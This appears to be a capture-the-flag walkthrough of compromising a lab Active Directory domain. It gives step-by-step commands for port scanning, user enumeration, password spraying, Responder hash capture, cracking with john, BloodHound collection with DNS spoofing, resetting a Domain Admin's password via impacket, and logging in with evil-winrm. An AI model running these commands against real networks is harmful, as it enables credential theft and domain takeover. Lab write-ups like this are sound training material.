- I start with a scan of the open ports.
    
    ```
    nmap -p- --open --min-rate 5000 -sS -Pn 10.0.2.7 -oG scan
    ```

- I continue with a scan of the versions and technologies that are running on the open ports that we have found.
    
    ```
    nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49680,49722 -sCV -Pn 10.0.2.7 -oN ports
    ```

- Using kerbrute I search for valid users in the system.
	
	```python
	/opt/kerbrute_linux_386 userenum --dc 10.0.2.7 -d SOUPEDECODE.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
	```

- I check if with the found users I can access as password any of the users but I don't get anything.
	
	```python
	netexec smb -u users_kerbrute -p users_kerbrute --continue-on-success  10.0.2.7 
	netexec smb -u users_kerbrute -p users_kerbrute --continue-on-success --no-brute 10.0.2.7 
	netexec winrm -u users_kerbrute -p users_kerbrute --continue-on-success  10.0.2.7 
	netexec winrm -u users_kerbrute -p users_kerbrute --continue-on-success --no-brute 10.0.2.7 
	```

- After trying different things I listen to answer to sniff the traffic.
	
	```python
	responder -I eth0  -w -d
	```

- I find a NTLMv2 hash that when I try to break with john I get the password of the user xkate578 in clear text.
	
	```python
	john --wordlist=/usr/share/wordlists/rockyou.txt hashNTLMv2 
	```

- I validate with these credentials the folders I have access to via smb and IPC$ and share are the most important ones.

- Thanks to having read permissions on IPC$ I am able to enumerate the system. From the information obtained, my user and the user fbeth103 stand out because of the groups to which they belong.
	
	```python
	ldapdomaindump -u 'SOUPEDECODE.LOCAL\xkate578' -p jesuschrist 10.0.2.7
	```

- Moving on now to the share folder, I list its contents and I manage to read the first flag
	
	```python
	smbclient -U "SOUPEDECODE.LOCAL/xkate578%jesuschrist" //10.0.2.7/share
	```

- I collect info with bloodhound-python to get another view of how the system is doing. At first it gives me a time failure and then another one with the dns server. To fix this second one I spoof the dns server on my machine with dnschef.

	```python
	dnschef --fakeip 10.0.2.7 
	ntpdate -u 10.0.2.7  ; bloodhound-python -u 'xkate578' -p 'jesuschrist' -ns 127.0.0.1 -d soupedecode.local -dc dc01.soupedecode.local --zip 
	```

- In this way I am able to extract the information and by deploying neo4j and bloodhound I am able to see graphically the relationships between users and groups.

- It does not suggest to me any way to make a lateral move or escalate privileges. I look for information about the group that user xkate578 belongs to, which is the one I have his credentials for, and I see that I can change the password to users. I try to change it to user fbeth103.
	
	```python
	impacket-changepasswd SOUPEDECODE.LOCAL/fbeth103@10.0.2.8  -altuser xkate578 -altpass jesuschrist -newpass Pepe123. -reset 
	#It can also be done with rpcclient
	```

- After changing the user's password and verifying that the new credentials are correct, I notice that this user is a member of “Operators” and member of “Domain Admins”. Thanks to this I can connect to the system and read the second flag.
	
	```python
	evil-winrm -i 10.0.2.8 -u fbeth103 -p Pepe123. 
	```
